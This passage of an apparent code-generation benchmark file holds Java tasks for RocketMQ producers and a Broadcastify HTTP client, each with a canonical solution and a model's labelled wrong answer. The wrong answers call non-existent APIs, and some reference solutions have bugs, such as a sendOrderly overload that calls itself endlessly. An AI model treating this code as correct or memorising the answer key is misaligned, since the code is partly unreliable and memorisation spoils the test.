ID, setting message keys and LMQ dispatch properties\n- shutdown() -> void - Shuts down the producer instance gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageConst;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class LMQProducer {\n    public static final String PRODUCER_GROUP = \"ProducerGroupName\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"TopicLMQParent\";\n    public static final String TAG = \"TagA\";\n    public static final String LMQ_TOPIC_1 = MixAll.LMQ_PREFIX + \"123\";\n    public static final String LMQ_TOPIC_2 = MixAll.LMQ_PREFIX + \"456\";\n\n    private DefaultMQProducer producer;\n\n    public void initialize() throws MQClientException {\n        producer = new DefaultMQProducer(PRODUCER_GROUP);\n        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        producer.start();\n    }\n\n    public SendResult sendMessage(int messageId) throws Exception {\n        Message msg = new Message(TOPIC, TAG, (\"Hello RocketMQ \" + messageId).getBytes(RemotingHelper.DEFAULT_CHARSET));\n        msg.setKeys(\"Key\" + messageId);\n        msg.putUserProperty(MessageConst.PROPERTY_INNER_MULTI_DISPATCH,\n            String.join(MixAll.LMQ_DISPATCH_SEPARATOR, LMQ_TOPIC_1, LMQ_TOPIC_2));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "public class LMQProducer {\n    private static final String PRODUCER_GROUP = \"LMQ_PRODUCER_GROUP\";\n    private static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    private static final String TOPIC = \"TEST_TOPIC\";\n    private static final String TAG = \"TEST_TAG\";\n    private static final String LMQ_TOPIC_1 = MixAll.LMQ_PREFIX + \"LMQ_TOPIC_1\";\n    private static final String LMQ_TOPIC_2 = MixAll.LMQ_PREFIX + \"LMQ_TOPIC_2\";\n    private DefaultMQProducer producer;\n\n    public void initialize() throws MQClientException {\n        producer = new DefaultMQProducer(PRODUCER_GROUP);\n        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        producer.start();\n    }\n\n    public SendResult sendMessage(int messageId) throws Exception {\n        Message msg = new Message(TOPIC, TAG, String.valueOf(messageId).getBytes());\n        msg.setKeys(String.valueOf(messageId));\n        SendResult sendResult = producer.send(msg);\n        producer.send(msg, LMQ_TOPIC_1);\n        producer.send(msg, LMQ_TOPIC_2);\n        return sendResult;\n    }\n\n    public void shutdown() {\n        if (producer != null) {\n            producer.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 385,
    "Instruction": "Task Description: Create a Java class that implements a simple RocketMQ producer to send messages to a specified topic.\n\nClass Description: The SimpleProducer class provides basic functionality to send messages to a RocketMQ broker. It handles producer initialization, message sending, and cleanup.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance that handles message sending operations\n\nMethods:\n- SimpleProducer(String producerGroup, String namesrvAddr) -> Constructor - Initializes the producer with the specified producer group and NameServer address\n- start() -> void - Starts the producer instance to begin sending messages\n- sendMessage(String topic, String tags, String keys, byte[] body) -> void - Creates and sends a message with the specified topic, tags, keys, and body content\n- shutdown() -> void - Shuts down the producer instance and releases resources",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class SimpleProducer {\n    private DefaultMQProducer producer;\n\n    public SimpleProducer(String producerGroup, String namesrvAddr) {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public void sendMessage(String topic, String tags, String keys, byte[] body) throws Exception {\n        Message msg = new Message(topic, tags, keys, body);\n        producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "public class SimpleProducer {\n    private DefaultMQProducer producer;\n\n    public SimpleProducer(String producerGroup, String namesrvAddr) {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() {\n        producer.start();\n    }\n\n    public void sendMessage(String topic, String tags, String keys, byte[] body) {\n        Message message = new Message(topic, tags, keys, body);\n        producer.send(message);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 388,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to a specified topic with configurable group, tags, and keys.\n\nClass Description: The Producer class encapsulates the functionality of a RocketMQ message producer. It handles initialization, message sending, and shutdown operations. The class provides methods to start the producer, send messages synchronously, and gracefully shut down the producer.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- group: String - The producer group name\n- topic: String - The topic to which messages will be sent\n- tags: String - The tags for message categorization\n- keys: String - The keys for message identification\n\nMethods:\n- Producer(String group, String topic, String tags, String keys) -> void - Constructor that initializes the producer with given group, topic, tags, and keys\n- start() -> void - Starts the producer instance\n- sendMessage(String messageContent) -> SendResult - Synchronously sends a message with the given content and returns the send result\n- shutdown() -> void - Shuts down the producer instance\n- buildCommandline(String[] args) -> CommandLine - Static method that builds and parses command line arguments for producer configuration",
    "Canonical_solution": "import org.apache.commons.cli.CommandLine;\nimport org.apache.commons.cli.DefaultParser;\nimport org.apache.commons.cli.HelpFormatter;\nimport org.apache.commons.cli.Option;\nimport org.apache.commons.cli.Options;\nimport org.apache.commons.cli.ParseException;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class Producer {\n\n    private DefaultMQProducer producer;\n    private String group;\n    private String topic;\n    private String tags;\n    private String keys;\n\n    public Producer(String group, String topic, String tags, String keys) throws MQClientException {\n        this.group = group;\n        this.topic = topic;\n        this.tags = tags;\n        this.keys = keys;\n        this.producer = new DefaultMQProducer(group);\n        this.producer.setInstanceName(Long.toString(System.currentTimeMillis()));\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String messageContent) throws Exception {\n        Message msg = new Message(\n            topic,\n            tags,\n            keys,\n            messageContent.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public static CommandLine buildCommandline(String[] args) {\n        final Options options = new Options();\n        Option opt = new Option(\"h\", \"help\", false, \"Print help\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        opt = new Option(\"g\", \"producerGroup\", true, \"Producer Group Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"t\", \"topic\", true, \"Topic Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"a\", \"tags\", true, \"Tags Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"k\", \"keys\", true, \"Keys Name\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        opt = new Option(\"c\", \"msgCount\", true, \"Message Count\");\n        opt.setRequired(true);\n        options.addOption(opt);\n\n        DefaultParser parser = new DefaultParser();\n        HelpFormatter hf = new HelpFormatter();\n        hf.setWidth(110);\n        CommandLine commandLine = null;\n        try {\n            commandLine = parser.parse(options, args);\n            if (commandLine.hasOption('h')) {\n                hf.printHelp(\"producer\", options, true);\n                return null;\n            }\n        } catch (ParseException e) {\n            hf.printHelp(\"producer\", options, true);\n            return null;\n        }\n\n        return commandLine;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.SendResult;\n\npublic class Producer {\n    private DefaultMQProducer producer;\n    private String group;\n    private String topic;\n    private String tags;\n    private String keys;\n\n    public Producer(String group, String topic, String tags, String keys) {\n        this.producer = new DefaultMQProducer(group);\n        this.group = group;\n        this.topic = topic;\n        this.tags = tags;\n        this.keys = keys;\n        producer.setTopic(topic);\n        producer.setTags(tags);\n        producer.setMessageKey(keys);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String messageContent) throws MQClientException {\n        Message msg = new Message(topic, tags, messageContent.getBytes());\n        msg.setMessageKey(keys);\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public static CommandLine buildCommandline(String[] args) {\n        return null;\n    }\n}"
  },
  {
    "Task_id": 39,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for making synchronous and asynchronous HTTP requests, specifically designed for interacting with the Broadcastify API.\n\nClass Description: The BroadcastifyHttpClient class provides methods for testing API connections and sending asynchronous requests to the Broadcastify service. It uses Java's HttpClient for HTTP/2 communication with configurable timeout and redirect policies.\n\nAttributes:\n- mHttpClient: [HttpClient] - The underlying HTTP client instance configured with HTTP/2 support, 20-second timeout, and normal redirect policy\n\nMethods:\n- testConnection: [testConnection](BroadcastifyCallConfiguration configuration) -> String - Tests the connection to the Broadcastify API by sending a synchronous multipart/form-data POST request with API key, system ID, and test flag. Returns the response body with status code or error message.\n- sendAsyncRequest: [sendAsyncRequest](HttpRequest request) -> void - Sends an HTTP request asynchronously and handles the response or error in a completion callback. Successful responses (status 200) and errors are handled separately.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\n\npublic class BroadcastifyHttpClient {\n\n    private HttpClient mHttpClient = HttpClient.newBuilder()\n        .version(HttpClient.Version.HTTP_2)\n        .followRedirects(HttpClient.Redirect.NORMAL)\n        .connectTimeout(Duration.ofSeconds(20))\n        .build();\n\n    public String testConnection(BroadcastifyCallConfiguration configuration) {\n        BroadcastifyCallBuilder bodyBuilder = new BroadcastifyCallBuilder();\n        bodyBuilder.addPart(FormField.API_KEY, configuration.getApiKey())\n            .addPart(FormField.SYSTEM_ID, configuration.getSystemID())\n            .addPart(FormField.TEST, 1);\n\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(configuration.getHost()))\n            .header(HttpHeaders.CONTENT_TYPE, MULTIPART_FORM_DATA + \"; boundary=\" + bodyBuilder.getBoundary())\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .header(HttpHeaders.ACCEPT, \"*/*\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        HttpResponse.BodyHandler<String> responseHandler = HttpResponse.BodyHandlers.ofString();\n\n        try {\n            HttpResponse<String> response = mHttpClient.send(request, responseHandler);\n            String responseBody = response.body();\n            return (responseBody != null ? responseBody : \"(no response)\") + \" Status Code:\" + response.statusCode();\n        }\n        catch(Exception e) {\n            return e.getLocalizedMessage();\n        }\n    }\n\n    public void sendAsyncRequest(HttpRequest request) {\n        mHttpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())\n            .whenComplete((response, throwable) -> {\n                if(throwable != null || response.statusCode() != 200) {\n                    if(!(throwable instanceof IOException || throwable instanceof CompletionException)) {\n                        // Handle non-I/O errors\n                    }\n                }\n                else {\n                    // Handle successful response\n                }\n            });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpClient.RedirectPolicy;\nimport java.net.http.HttpClient.Redirect;\nimport java.net.http.MultiPart;\nimport java.net.http.HttpClient.RequestTimeoutException;\nimport java.util.concurrent.CompletableFuture;\n\npublic class BroadcastifyHttpClient {\n    private final HttpClient mHttpClient;\n\n    public BroadcastifyHttpClient() {\n        mHttpClient = HttpClient.newHttpClient()\n            .withDeadlineNanos(System.nanoTime() + 20_000_000_000L);\n        mHttpClient.setRedirectPolicy(Redirect.NORMAL);\n    }\n\n    public String testConnection(BroadcastifyCallConfiguration configuration) throws Exception {\n        String apiKey = configuration.getApiKey();\n        String systemId = configuration.getSystemId();\n        boolean testFlag = configuration.getTestFlag();\n        String url = configuration.getUrl();\n\n        MultiPart multipart = MultiPart.getBodyBuilder();\n        multipart.field(\"apiKey\", apiKey);\n        multipart.field(\"systemId\", systemId);\n        multipart.field(\"test\", String.valueOf(testFlag));\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(url))\n            .POST(multipart.build())\n            .build();\n\n        HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        return response.body();\n    }\n\n    public void sendAsyncRequest(HttpRequest request) {\n        CompletableFuture<HttpResponse<String>> future = mHttpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString());\n        future.thenAccept(response -> {\n            if (response.statusCode() == 200) {\n                System.out.println(\"Success: \" + response.body());\n            } else {\n                System.err.println(\"Error: \" + response.statusCode() + \" - \" + response.body());\n            }\n        }).exceptionally(ex -> {\n            ex.printStackTrace();\n            return null;\n        });\n    }\n}"
  },
  {
    "Task_id": 390,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to a specified topic with a given tag. The class should handle producer initialization, message sending, and resource cleanup.\n\nClass Description: The Producer class encapsulates the functionality of a RocketMQ message producer. It manages the producer lifecycle (startup and shutdown) and provides a method to send messages to a RocketMQ broker.\n\nAttributes:\n- producer: DefaultMQProducer - The underlying RocketMQ producer instance that handles message sending operations\n\nMethods:\n- Constructor: Producer(String producerGroup, String namesrvAddr) -> void - Initializes a new producer instance with the specified producer group and NameServer address\n- start: start() -> void - Starts the producer instance to begin sending messages\n- sendMessage: sendMessage(String topic, String tag, String messageBody) -> SendResult - Creates and sends a message to the specified topic with the given tag and body\n- shutdown: shutdown() -> void - Shuts down the producer instance and releases resources",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class Producer {\n\n    private DefaultMQProducer producer;\n\n    public Producer(String producerGroup, String namesrvAddr) throws MQClientException {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tag, String messageBody) throws Exception {\n        Message msg = new Message(topic, \n                                tag,\n                                messageBody.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "public class Producer {\n    private DefaultMQProducer producer;\n\n    public Producer(String producerGroup, String namesrvAddr) {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tag, String messageBody) {\n        Message msg = new Message(topic, tag, messageBody.getBytes());\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 393,
    "Instruction": "Task Description: Create a Java class that serves as a template for interacting with RocketMQ producers, providing various methods to send messages (including ordered messages) with configurable parameters.\n\nClass Description: The RocketMQTemplate class is a utility class that simplifies interaction with RocketMQ producers. It manages producer instances, provides default configurations, and offers multiple methods for sending messages with different levels of customization. The class handles both regular and ordered message sending, with configurable timeouts, queue numbers, and producer groups.\n\nAttributes:\n- log: [InternalLogger] - Logger instance for error and debug logging\n- DEFAULT_PRODUCER_GROUP: [String] - Default producer group name\n- DEFAULT_QUEUE_NUM: [int] - Default number of queues\n- DEFAULT_SEND_MSG_TIMEOUT: [int] - Default message sending timeout in milliseconds\n- producerMap: [Map<String, DefaultMQProducer>] - Map storing producer instances with their configuration keys\n\nMethods:\n- getProducer() -> [DefaultMQProducer] - Gets a producer with default settings\n- getProducer([int queueNum]) -> [DefaultMQProducer] - Gets a producer with custom queue number\n- getProducer([String producerGroup, int sendMsgTimeout]) -> [DefaultMQProducer] - Gets a producer with custom group and timeout\n- getProducer([int queueNum, String producerGroup, int sendMsgTimeout]) -> [DefaultMQProducer] - Gets a fully customized producer\n- send([String topic, String body]) -> [SendResult] - Sends a message with default settings\n- send([String topic, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with custom timeout\n- send([String producerGroup, String topic, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with custom group and timeout\n- send([String producerGroup, String topic, String tags, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with tags\n- send([String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with tags and keys\n- send([String producerGroup, Message message, int sendMsgTimeout]) -> [SendResult] - Internal method for sending messages\n- sendOrderly([String producerGroup, String topic, String keys, String body]) -> [SendResult] - Sends ordered message with default timeout\n- sendOrderly([String producerGroup, String topic, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends ordered message with custom timeout\n- sendOrderly([String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends ordered message with tags\n- sendOrderly([String producerGroup, Message message, int sendMsgTimeout]) -> [SendResult] - Internal method for sending ordered messages",
    "Canonical_solution": "import org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.lang3.math.NumberUtils;\nimport org.apache.rocketmq.client.log.ClientLogger;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.logging.InternalLogger;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class RocketMQTemplate {\n\n    private static final InternalLogger log = ClientLogger.getLog();\n\n    private static final String DEFAULT_PRODUCER_GROUP = \"default-producer\";\n    private static final int DEFAULT_QUEUE_NUM = 4;\n    private static final int DEFAULT_SEND_MSG_TIMEOUT = 3000;\n\n    private static Map<String, DefaultMQProducer> producerMap = new HashMap<>();\n\n    public static DefaultMQProducer getProducer() throws Exception {\n        return getProducer(DEFAULT_QUEUE_NUM, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static DefaultMQProducer getProducer(int queueNum) throws Exception {\n        return getProducer(queueNum, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static DefaultMQProducer getProducer(String producerGroup, int sendMsgTimeout) throws Exception {\n        return getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n    }\n\n    public static DefaultMQProducer getProducer(int queueNum, String producerGroup, int sendMsgTimeout) throws Exception {\n        if (queueNum < 1) throw new IllegalArgumentException(\"queueNum must >= 1\");\n        if (StringUtils.isBlank(producerGroup)) throw new IllegalArgumentException(\"producerGroup cannot be null\");\n        String producerKey = producerGroup + queueNum;\n        if (producerMap.get(producerKey) == null) {\n            synchronized (producerMap) {\n                if (producerMap.get(producerKey) == null) {\n                    DefaultMQProducer producer = new DefaultMQProducer(DEFAULT_PRODUCER_GROUP);\n                    producer.setDefaultTopicQueueNums(queueNum);\n                    producer.setSendMsgTimeout(sendMsgTimeout);\n                    producer.start();\n                    producerMap.put(producerKey, producer);\n                }\n            }\n        }\n        return producerMap.get(producerKey);\n    }\n\n    public static SendResult send(String topic, String body) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static SendResult send(String topic, String body, int sendMsgTimeout) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, \"\", body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String tags, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, tags, \"\", body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        try {\n            return send(producerGroup, new Message(topic, tags, keys, body.getBytes(RemotingHelper.DEFAULT_CHARSET)), sendMsgTimeout);\n        } catch (Exception e) {\n            log.error(\"send error, producerGroup:{}, topic:{}, tags:{}, keys:{}, body:{}\",\n                    producerGroup, topic, tags, keys, body, e);\n            throw new MessagingException(e.getMessage(), e);\n        }\n    }\n\n    private static SendResult send(String producerGroup, Message message, int sendMsgTimeout) throws Exception {\n        return getProducer(producerGroup, sendMsgTimeout).send(message);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String keys, String body) {\n        return sendOrderly(producerGroup, topic, keys, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String keys, String body, int sendMsgTimeout) {\n        return sendOrderly(producerGroup, topic, keys, body, sendMsgTimeout);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        try {\n            return sendOrderly(producerGroup, new Message(topic, tags, keys, body.getBytes(RemotingHelper.DEFAULT_CHARSET)), sendMsgTimeout);\n        } catch (Exception e) {\n            log.error(\"send error, producerGroup:{}, topic:{}, tags:{}, keys:{}, body:{}\",\n                    producerGroup, topic, tags, keys, body, e);\n            throw new MessagingException(e.getMessage(), e);\n        }\n    }\n\n    private static SendResult sendOrderly(String producerGroup, Message message, int sendMsgTimeout) throws Exception {\n        return getProducer(producerGroup, sendMsgTimeout).send(message,\n                new MessageQueueSelector() {\n                    @Override\n                    public MessageQueue select(List<MessageQueue> mqs, Message msg, Object arg) {\n                        long id = NumberUtils.toLong(String.valueOf(arg));\n                        int index = (int) (id % mqs.size());\n                        return mqs.get(index);\n                    }\n                }, message.getKeys());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "```java\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\nimport com.alibaba.rocketmq.client.producer.DefaultMQProducer;\nimport com.alibaba.rocketmq.client.exception.MQClientException;\nimport com.alibaba.rocketmq.common.message.Message;\nimport com.alibaba.rocketmq.common.message.MessageOrderly;\nimport com.alibaba.rocketmq.client.producer.SendResult;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class RocketMQTemplate {\n    private static final Logger log = LogManager.getLogger(RocketMQTemplate.class);\n    private static final String DEFAULT_PRODUCER_GROUP = \"DEFAULT_PRODUCER_GROUP\";\n    private static final int DEFAULT_QUEUE_NUM = 4;\n    private static final int DEFAULT_SEND_MSG_TIMEOUT = 3000;\n    private final Map<String, DefaultMQProducer> producerMap = new HashMap<>();\n\n    public DefaultMQProducer getProducer() {\n        return getProducer(DEFAULT_QUEUE_NUM, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public DefaultMQProducer getProducer(int queueNum) {\n        return getProducer(queueNum, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public DefaultMQProducer getProducer(String producerGroup, int sendMsgTimeout) {\n        return getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n    }\n\n    public DefaultMQProducer getProducer(int queueNum, String producerGroup, int sendMsgTimeout) {\n        String key = producerGroup;\n        DefaultMQProducer producer = producerMap.get(key);\n        if (producer == null) {\n            try {\n                producer = new DefaultMQProducer(producerGroup);\n                producer.setNamesrvAddr(\"localhost:9876\");\n                producer.setQueueNums(queueNum);\n                producer.setSendMsgTimeout(sendMsgTimeout);\n                producer.start();\n                producerMap.put(key, producer);\n            } catch (MQClientException e) {\n                log.error(\"Failed to create producer for group {}\", producerGroup, e);\n            }\n        }\n        return producer;\n    }\n\n    public SendResult send(String topic, String body) {\n        DefaultMQProducer producer = getProducer();\n        try {\n            Message msg = new Message(topic, null, body.getBytes());\n            return producer.send(msg);\n        } catch (MQClientException e) {\n            log.error(\"Failed to send message to topic {}\", topic, e);\n            return null;\n        }\n    }\n\n    public SendResult send(String topic, String body, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(DEFAULT_QUEUE_NUM, DEFAULT_PRODUCER_GROUP, sendMsgTimeout);\n        try {\n            Message msg = new Message(topic, null, body.getBytes());\n            return producer.send(msg);\n        } catch (MQClientException e) {\n            log.error(\"Failed to send message to topic {}\", topic, e);\n            return null;\n        }\n    }\n\n    public SendResult send(String producerGroup, String topic, String body, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(producerGroup, sendMsgTimeout);\n        try {\n            Message msg = new Message(topic, null, body.getBytes());\n            return producer.send(msg);\n        } catch (MQClientException e) {\n            log.error(\"Failed to send message to topic {}\", topic, e);\n            return null;\n        }\n    }\n\n    public SendResult send(String producerGroup, String topic, String tags, String body, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(producerGroup, sendMsgTimeout);\n        try {\n            Message msg = new Message(topic, tags, body.getBytes());\n            return producer.send(msg);\n        } catch (MQClientException e) {\n            log.error(\"Failed to send message to topic {}\", topic, e);\n            return null;\n        }\n    }\n\n    public SendResult send(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(producerGroup, sendMsgTimeout);\n        try {\n            Message msg = new Message(topic, tags, keys, body.getBytes());\n            return producer.send(msg);\n        } catch (MQClientException e) {\n            log.error(\"Failed to send message to topic {}\", topic, e);\n            return null;\n        }\n    }\n\n    public SendResult send(String producerGroup, Message message, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(producerGroup, sendMsgTimeout);\n        try {\n            return producer.send(message);\n        } catch (MQClientException e) {\n            log.error(\"Failed to send message to topic {}\", message.getTopic(), e);\n            return null;\n        }\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String keys, String body) {\n        DefaultMQProducer producer = getProducer(producerGroup, DEFAULT_SEND_MSG_TIMEOUT);\n        try {\n            MessageOrderly msg = new MessageOrderly(topic, keys, body.getBytes());\n            return producer.sendOrderly(msg);\n        } catch (MQClientException e) {\n            log.error(\"Failed to send orderly message to topic {}\", topic, e);\n            return null;\n        }\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String keys, String body, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(producerGroup, sendMsgTimeout);\n        try {\n            MessageOrderly msg = new MessageOrderly(topic, keys, body.getBytes());\n            return producer.sendOrderly(msg);\n        } catch (MQClientException e) {\n            log.error(\"Failed to send orderly message to topic {}\", topic, e);\n            return null;\n        }\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(producerGroup, sendMsgTimeout);\n        try {\n            MessageOrderly msg = new MessageOrderly(topic, tags, keys, body.getBytes());\n            return producer.sendOrderly(msg);\n        } catch (MQClientException e) {\n            log.error(\"Failed to send orderly message to topic {}\", topic, e);\n            return null;\n        }\n    }\n\n    public SendResult sendOrderly(String producerGroup, Message message, int sendMsgTimeout) {\n        DefaultMQProducer producer = getProducer(producerGroup, sendMsgTimeout);\n        try {\n            return producer.sendOrderly(message);\n        } catch (MQClientException e) {\n            log.error(\"Failed to send orderly message to topic {}\", message.getTopic(), e);\n            return null;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 394,
    "Instruction": "Task Description: Implement a Java class that acts as a RocketMQ producer to send messages to a specified topic with a given tag.\n\nClass Description: The RocketMQProducer class encapsulates the functionality to initialize, send messages, and shutdown a RocketMQ producer instance. It handles the connection to the RocketMQ NameServer and manages message production.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namespace: String - The namespace for the producer (V2 version)\n- producerGroup: String - The group name for the producer\n- namesrvAddr: String - The address of the NameServer\n- topic: String - The topic to which messages will be sent\n- tag: String - The tag for the messages\n\nMethods:\n- RocketMQProducer(String namespace, String producerGroup, String namesrvAddr, String topic, String tag) -> None - Constructor that initializes the producer with the given parameters\n- initialize() -> void - Configures and starts the producer instance with the specified namespace and NameServer address\n- sendMessage(String messageContent) -> void - Creates and sends a message with the given content to the configured topic and tag\n- shutdown() -> void - Shuts down the producer instance gracefully",
